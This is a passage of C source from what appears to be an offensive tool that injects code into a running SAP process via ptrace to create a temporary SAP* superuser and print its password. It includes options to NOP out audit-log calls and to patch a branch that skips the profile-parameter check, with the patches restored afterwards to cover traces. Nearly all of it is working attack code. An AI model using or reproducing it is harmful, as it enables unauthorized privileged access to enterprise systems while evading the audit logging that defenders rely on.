    /* ── Attach ───────────────────────────────────────────────────────── */
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        fprintf(stderr, "[-] ptrace attach failed: %s\n", strerror(errno));
        fprintf(stderr, "    Check /proc/sys/kernel/yama/ptrace_scope (need 0 or 1)\n");
        return 1;
    }
    waitpid(pid, NULL, 0);

    struct user_regs_struct saved;
    ptrace(PTRACE_GETREGS, pid, 0, &saved);

    uintptr_t syscall_site = find_syscall_site(pid, base, 0x100000);
    if (!syscall_site) {
        fprintf(stderr, "[-] No syscall instruction found in text\n");
        ptrace(PTRACE_DETACH, pid, 0, 0); return 1;
    }

    /* ── Allocate R/W scratch region (no PROT_EXEC — not needed) ───────────
     * mmap(PROT_RWX) is commonly blocked by SELinux, kernel hardening, or
     * memory protection policies on modern SAP hosts. We only need R/W:
     *   - data (client string, password output)
     *   - fresh stack for the injected function call
     * The INT3 return trap lives in the text section (planted via PTRACE_POKETEXT).
     *
     * Scratch layout (SCRATCH_SIZE = 1 MB):
     *   [+0x000]: char16_t client[3]  — input (6 bytes)
     *   [+0x100]: char16_t pw_buf[40] — output password (80 bytes)
     *   [+0x200 - end]: stack (grows down from scratch+SCRATCH_SIZE)
     */
    long scratch = inject_syscall(pid, &saved, syscall_site,
                                  9 /*mmap*/, 0, SCRATCH_SIZE,
                                  PROT_READ|PROT_WRITE,   /* no EXEC */
                                  MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (scratch <= 0) {
        fprintf(stderr, "[-] mmap failed: %ld (%s)\n", scratch,
                scratch == -1  ? "EPERM — check SELinux/seccomp" :
                scratch == -12 ? "ENOMEM"  : "see errno");
        ptrace(PTRACE_DETACH, pid, 0, 0); return 1;
    }
    if (!quiet) printf("[*] R/W scratch (1MB): 0x%lx\n", scratch);

    /* Write client string to scratch */
    uint8_t init[0x200] = {0};
    uint16_t client_u16[3] = {0};
    to_utf16(client, client_u16, 3);
    memcpy(init, client_u16, sizeof(client_u16));   /* at scratch+0x000 */
    /* pw_buf at scratch+0x100 — already zeroed */

    if (mem_write_rw(pid, (uintptr_t)scratch, init, sizeof(init)) < 0) {
        fprintf(stderr, "[-] Failed to write data to scratch page\n");
        goto cleanup;
    }

    uintptr_t client_ptr = (uintptr_t)scratch + 0x000;
    uintptr_t pw_ptr     = (uintptr_t)scratch + 0x100;

    /*
     * Return trap: plant INT3 at `syscall_site` in text using PTRACE_POKETEXT.
     * The function's `ret` will pop [rsp] = syscall_site → INT3 → SIGTRAP.
     * PTRACE_POKETEXT bypasses r-x page permissions; process_vm_writev cannot.
     */
    uintptr_t trap_site = syscall_site;  /* reuse known-good text location */

    /* ── Optionally suppress audit log (--no-audit) ─────────────────────
     * virtual_user_audit_log_create is called unconditionally inside
     * create_virtual_user_internal at two sites:
     *   SUCCESS site  (nm 0xc7ef6f): after slot written + broadcast
     *   DISABLED site (nm 0xc7e889): only when purpose==2 + param disabled
     * We NOP both 5-byte `call rel32` instructions before invoking the
     * function and restore them immediately after.
     *
     * If ELF symbol resolution found virtual_user_audit_log_create, we
     * locate call sites dynamically by scanning create_virtual_user_internal
     * for `e8 XX XX XX XX` instructions that target the audit function.
     * Otherwise fall back to kernel 916 hardcoded nm offsets.
     */
    uintptr_t audit_site[2] = {0, 0};
    uint8_t   audit_orig[2][5];
    int       audit_count = 0;
    static const uint8_t nop5[5] = { 0x90, 0x90, 0x90, 0x90, 0x90 };

    if (no_audit) {
        if (off_audit) {
            /* Dynamic: scan create_virtual_user_internal body for calls to audit fn */
            uintptr_t fn_rt    = base + off_internal;
            uintptr_t audit_rt = base + off_audit;
            uint8_t   fbuf[0x1000];
            if (mem_read(pid, fn_rt, fbuf, sizeof(fbuf)) == 0) {
                for (size_t i = 0; i + 5 <= sizeof(fbuf) && audit_count < 2; i++) {
                    if (fbuf[i] != 0xe8) continue;
                    int32_t rel; memcpy(&rel, fbuf + i + 1, 4);
                    uintptr_t target = fn_rt + i + 5 + (uintptr_t)(intptr_t)rel;
                    if (target == audit_rt)
                        audit_site[audit_count++] = fn_rt + i;
                }
            }
        }
        if (audit_count == 0) {
            /* Fallback: kernel 916 hardcoded nm offsets */
            audit_site[0] = base + NM_K916_AUDIT_SUCCESS;
            audit_site[1] = base + NM_K916_AUDIT_DISABLED;
            audit_count   = 2;
        }
        for (int i = 0; i < audit_count; i++) {
            peek_text_n(pid, audit_site[i], audit_orig[i], 5);
            poke_text_n(pid, audit_site[i], nop5, 5);
        }
        if (!quiet) printf("[*] Audit log suppressed (%d call site(s) NOPed)\n", audit_count);
    }

    /* ── Optionally bypass login/create_virtual_user_sapstar (--no-profile-check) ──
     * One-byte patch: JE (0x74) -> JMP (0xEB) at NM_K916_PROFILE_CHECK_OFF, the
     * branch taken inside create_virtual_user_internal when purpose==2 and the
     * profile param is NOT disabled. Forcing it unconditional makes the
     * "allowed" path run regardless of the profile param's value.
     */
    uintptr_t profile_site = base + off_internal + NM_K916_PROFILE_CHECK_OFF;
    uint8_t   profile_orig = 0;
    if (no_profile_check) {
        peek_text_n(pid, profile_site, &profile_orig, 1);
        if (profile_orig != 0x74) {
            fprintf(stderr,
                "[-] --no-profile-check: expected JE (0x74) at 0x%lx, found 0x%02x.\n"
                "    Offset doesn't match this binary's layout — refusing to patch\n"
                "    (would corrupt unrelated code). Aborting.\n",
                profile_site, profile_orig);
            ptrace(PTRACE_DETACH, pid, 0, 0);
            return 1;
        }
        uint8_t jmp_byte = 0xEB;
        poke_text_n(pid, profile_site, &jmp_byte, 1);
        if (!quiet) printf("[*] login/create_virtual_user_sapstar check bypassed (1 byte patched)\n");
    }

    /* ── Call the function ────────────────────────────────────────────── */
    int rc = -1;
    if (bypass) {
        /*
         * create_virtual_user_internal(client[3]*, int16_t purpose,
         *                              int32_t validity, char16_t pw[40]*)
         * rdi=client_ptr  rsi=purpose  rdx=validity  rcx=pw_ptr
         *
         * login/create_virtual_user_sapstar is checked ONLY for purpose==2.
         * Using purpose=1 (default --bypass) skips that check entirely.
         */
        rc = call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                            fn_target,
                            client_ptr, (uintptr_t)purpose, validity,
                            (long)pw_ptr, singlestep, base);
    } else {
        /*
         * create_virtual_sapstar(client*, pw_buf*, int32_t validity)
         * rdi=client_ptr  rsi=pw_ptr  rdx=validity
         */
        rc = call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                            fn_target,
                            client_ptr, pw_ptr, validity, 0, singlestep, base);
    }

    /* ── Restore audit log call sites immediately after call ────────────── */
    if (no_audit) {
        for (int i = 0; i < audit_count; i++)
            poke_text_n(pid, audit_site[i], audit_orig[i], 5);
        if (!quiet) printf("[*] Audit log call sites restored\n");
    }

    /* ── Restore profile-param check immediately after call ─────────────── */
    if (no_profile_check) {
        poke_text_n(pid, profile_site, &profile_orig, 1);
        if (!quiet) printf("[*] login/create_virtual_user_sapstar check restored\n");
    }

    /* ── Read and print password ──────────────────────────────────────── */
    if (rc == RC_OK) {
        uint16_t pw16[PW_BUF_CHARS] = {0};
        mem_read(pid, pw_ptr, pw16, sizeof(pw16));
        char pw[PW_BUF_CHARS + 1] = {0};
        from_utf16(pw16, pw, PW_BUF_CHARS);

        if (quiet) {
            printf("%s\n", pw);
        } else {
            printf("\n[+] Created successfully\n");
            printf("    Client:   %s\n", client);
            printf("    Purpose:  %d%s\n", purpose,
                   purpose == 2 ? " (SAP*)" :
                   purpose == 1 ? " (purpose-1 user)" : " (signing user)");
            printf("    Validity: %d min\n", validity);
            printf("    Password: %s\n\n", pw);
            printf("    SAP logon: user=SAP*, client=%s, password=%s\n", client, pw);
        }
    } else {
        static const char *msgs[] = {
            "OK","INTERNAL_ERR","PURPOSE_UNKNOWN","INVALID_VALIDITY",
            "RNG_ERR","RSEC_ERR","NO_SPACE","INVALID_CLIENT","CREATION_DISABLED"
        };
        const char *m = (rc>=0 && rc<=8) ? msgs[rc] : "UNKNOWN";
        fprintf(stderr, "[-] rc=%d (%s)\n", rc, m);
        if (rc==8) fprintf(stderr, "    Hint: login/create_virtual_user_sapstar disabled.\n"
                                   "    With --bypass, purpose=1 skips this check.\n"
                                   "    But purpose=1 requires username for purpose-1 to\n"
                                   "    exist in client %s.\n", client);
        if (rc==7) fprintf(stderr, "    Hint: client %s not found, or purpose-%d username\n"
                                   "    does not exist in this client.\n", client, purpose);
    }

cleanup:
    if (scratch > 0)
        inject_syscall(pid, &saved, syscall_site,
                       11 /*munmap*/, scratch, SCRATCH_SIZE, 0,0,0,0);
    ptrace(PTRACE_SETREGS, pid, 0, &saved);
    ptrace(PTRACE_DETACH,  pid, 0, 0);
    return (rc == RC_OK) ? 0 : 1;
}
